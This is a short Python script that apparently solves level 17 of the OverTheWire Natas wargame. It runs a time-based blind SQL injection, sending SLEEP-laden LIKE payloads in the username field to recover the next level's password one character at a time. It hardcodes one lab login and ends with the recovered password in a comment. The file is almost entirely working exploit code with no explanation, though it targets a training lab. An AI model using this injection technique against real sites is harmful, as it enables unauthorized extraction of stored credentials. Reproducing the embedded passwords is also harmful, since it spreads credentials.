#!/usr/bin/env python3

import requests
import re
import string
from time import *

req = requests.Session()

s= string.ascii_letters+string.digits

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
url = "http://%s.natas.labs.overthewire.org/" % username

# data = {"username":'natas18" AND SLEEP(5)#'}
# req_post = req.post(url,auth=(username,password),data=data)
# print(req_post.text)

passwordd=""

while len(passwordd)!=32:
	for i in s:
		payload = passwordd+i
		start = time()
		data = {"username":'natas18" AND BINARY password LIKE "'+payload+'%" AND SLEEP(4) #'}		
		req_post = req.post(url,auth=(username,password),data=data)
		print("Trying...",payload)
		end = time()
		if ((end-start) > 3):
			passwordd+=i
			break
print(passwordd)

# natas18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP